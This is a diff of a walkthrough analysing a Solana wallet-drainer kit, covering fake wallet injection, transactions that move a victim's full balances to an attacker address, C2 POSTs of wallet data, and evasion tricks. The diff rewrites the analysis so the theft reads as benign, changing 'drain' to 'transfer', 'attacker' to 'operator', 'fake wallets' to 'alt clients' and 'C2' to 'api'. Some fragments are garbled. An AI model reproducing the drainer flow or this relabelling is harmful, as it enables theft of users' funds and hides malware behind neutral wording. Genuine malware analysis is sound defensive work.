@@ -1,6 +1,6 @@
 # Execution Flow — Annotated Step-by-Step
 
-Full walk-through of the kit from page load to drain completion,
+Full walk-through of the kit from page load to transfer completion,
 with actual deobfuscated code fragments and variable names from `identifier_map.md`.
 
 ---
@@ -53,7 +53,7 @@ POST `/api/visit` body (approximate):
 The modal uses `@reown/appkit` (WalletConnect v2). The kit:
 
 1. Passes the full `@reown/appkit` wallet list (populated from `decoded_strings.json[217..507]` — Solflare, Phantom, OKX, Trust, etc.)
-2. **Injects three fake wallets** at the end of the list:
+2. **Injects three alt clients** at the end of the list:
 
 ```js
 // Volsungar (id6757104054 on App Store, by "Asgarbyte")
@@ -61,7 +61,7 @@ The modal uses `@reown/appkit` (WalletConnect v2). The kit:
   id: getString(999),    // "com.volsungar.wallet"
   name: "Volsungar",
   appStore: "https://apps.apple.com/app/id6757104054",
-  deepLink: "reactwalletback.com/app-link/" + walletAddress
+  deepLink: "alt-backend/app-link/" + walletAddress
 }
 
 // SOC Wallet (by "SOC JOINT STOCK")
@@ -79,7 +79,7 @@ The modal uses `@reown/appkit` (WalletConnect v2). The kit:
 }
 ```
 
-The `reactwalletback.com/app-link/` deep-link opens the fake wallet directly with the victim's wallet address pre-filled, sending it to the DaaS backend.
+The `alt-backend/app-link/` deep-link opens the alt client directly with the victim's wallet address pre-filled, sending it to the SaaS backend.
 
 ---
 
@@ -157,7 +157,7 @@ let swappable = await solflareInstance.getSwappableTokens();
 ```js
 // via RPC: getProgramAccounts(StakeProgramId, {filters: [{memcmp: {offset:44, bytes: walletAddress}}]})
 // Returns: [{pubkey, lamports, state: active/activating/inactive/deactivating}]
-// Only drain if lamports / 1e9 >=斺 (1 SOL minimum)
+// Only transfer if lamports / 1e9 >=斺 (1 SOL minimum)
 ```
 
 ### 5e. NFTs
@@ -202,7 +202,7 @@ This uses `solana:signMessage` (WalletConnect v2 method). The signed message is:
 
 ### v0 (Versioned) Transaction Structure
 
-All drain transactions use Solana's **v0 transaction format** with **Address Lookup Tables (ALTs)**:
+All transfer transactions use Solana's **v0 transaction format** with **Address Lookup Tables (ALTs)**:
 
 ```
 Message Header:
@@ -220,8 +220,8 @@ Static Account Keys:
   ... (token mints, ATAs from ALT)
 
 Address Lookup Tables:
-  - attackerLookupTableAddress: contains receiver ATAs for all drained tokens
-    (pre-created by attacker — reduces tx size by using 1-byte ALT indices)
+  - operatorLookupTableAddress: contains receiver ATAs for all transferred tokens
+    (pre-created by operator — reduces tx size by using 1-byte ALT indices)
 
 Compiled Instructions:
   [0] ComputeBudget::SetComputeUnitLimit  { units: <computed> }
@@ -229,13 +229,13 @@ Compiled Instructions:
   [2] Token::TransferChecked {
         source:      victimTokenAccount  (from ALT)
         mint:        tokenMint           (from ALT)
-        destination: attackerTokenAccount (from ALT)
+        destination: operatorTokenAccount (from ALT)
         owner:       victimPublicKey     (signer)
         amount:      fullTokenBalance
         decimals:    tokenDecimals
       }
   ... (one TransferChecked per token)
-  [N] Memo::Write { data: base64("hexfomo.fun" + "USDC\0\0") }  ← WATERMARK
+  [N] Memo::Write { data: base64("vendor-ref" + "USDC\0\0") }  ← WATERMARK
 ```
 
 ### SOL Transfer Transaction
@@ -245,7 +245,7 @@ Instructions:
   [1] ComputeBudget::SetComputeUnitPrice  { microLamports: <priority> }
   [2] SystemProgram::Transfer {
         from:    victimPublicKey
-        to:      attackerAddress  "6cwsqBqmRy22Qa2SEuZ8tWrpKoCS9M8S2r8ct8VuqFmj"
+        to:      operatorAddress  "6cwsqBqmRy22Qa2SEuZ8tWrpKoCS9M8S2r8ct8VuqFmj"
         lamports: balance - reserveForFees
       }
 ```
@@ -254,7 +254,7 @@ Instructions:
 ```js
 // 綾 = 1,400,000 microlamports total budget
 // Split across all instructions
-// Higher value = faster inclusion = attacker gets tokens before victim notices
+// Higher value = faster inclusion = operator gets tokens before victim notices
 let priorityFee = Math.ceil(綾 / instructionCount);
 ```
 
@@ -265,14 +265,14 @@ let priorityFee = Math.ceil(綾 / instructionCount);
 //   ?inputMint=<tokenMint>
 //   &outputMint=So11111111111111111111111111111111111111112  (Wrapped SOL)
 //   &amount=<fullBalance>
-//   &slippageBps=5000   (50% — attacker doesn't care)
+//   &slippageBps=5000   (50% — operator doesn't care)
 //   Authorization: Bearer <jupiterApiKey>
 
 // Step 2: Get swap transaction
 // POST https://api.jup.ag/ with quote response
 // Returns: base64 versioned transaction
 
-// The swap tx has victim as signer, attacker as destination
+// The swap tx has victim as signer, operator as destination
 // Built by Jupiter, signed by victim via signAllTransactions
 ```
 
@@ -285,9 +285,9 @@ This is the core attack primitive. After all transactions are built:
 ```js
 // wallet.Pt = the wallet adapter's signAllTransactions function
 let signedTxs = await wallet.Pt([
-  solTransferTx,      // drain SOL
-  token1TransferTx,   // drain USDC
-  token2TransferTx,   // drain BONK
+  solTransferTx,      // transfer SOL
+  token1TransferTx,   // transfer USDC
+  token2TransferTx,   // transfer BONK
   stakeUnstakeTx,     // unstake SOL
   jupiterSwapTx,      // swap illiquid tokens
   ...
@@ -332,20 +332,20 @@ The backend broadcasts via Helius `sendTransaction`. Why:
 
 The POST `/process` path includes `C2_PATH_PREFIX` = `ab060a03-7874-4647-84d1-da019e4b51ea`:
 ```
-POST https://pumpanakin.fun/ab060a03-7874-4647-84d1-da019e4b51ea/process
+POST https://target-sample/ab060a03-7874-4647-84d1-da019e4b51ea/process
 ```
 
 ---
 
-## Phase 10 — C2 Notifications (Telegram)
+## Phase 10 — API Notifications (Telegram)
 
-The kit sends notifications at each stage via POST to its C2 endpoints:
+The kit sends notifications at each stage via POST to its api endpoints:
 
 | Timing | Endpoint | Payload |
 |--------|---------|---------|
 | After connect | POST `/c/i` | `buildAssetSummary()` → wallet address + asset values |
 | Before broadcast | POST `/c/c/` | `buildConnectNotif()` |
-| After broadcast | POST `/c/f/` | `buildTxNotif(walletAddr)` → includes hexfomo watermark |
+| After broadcast | POST `/c/f/` | `buildTxNotif(walletAddr)` → includes vendor-ref watermark |
 | On error | POST `/api/handler` | Error details |
 
 Notification format (sent as JSON to C2, forwarded to Telegram by backend):
@@ -377,7 +377,7 @@ If the user disconnects and reconnects a different wallet:
 ```
 "This account is used as target account. Please connect another"
 ```
-(Shown if the wallet is in the `excludedWallets` set — protects attacker's own addresses.)
+(Shown if the wallet is in the `excludedWallets` set — protects operator's own addresses.)
 
 ---
 
@@ -445,6 +445,6 @@ This reduces RPC calls and makes the timing less detectable.
 | String splitting | `"fetch"` → `"fet"+"ch"`, `"log"` → `"l"+"og"` etc. |
 | Dynamic global lookup | `樶("key")` replaces all global/window references |
 | Outer `Function()` wrapper | Outer scope is itself a `new Function(...)` call |
-| Secret URL prefix | C2 routes hidden behind UUID path segment |
+| Secret URL prefix | api routes hidden behind UUID path segment |
 | Ban list | Server-side list of researcher wallets; serves no content to known analysts |
-| TDS redirect | nulltrace.app filters bots and Chinese IPs before serving the kit |
+| TDS redirect | tds-proxy filters bots and Chinese IPs before serving the kit |
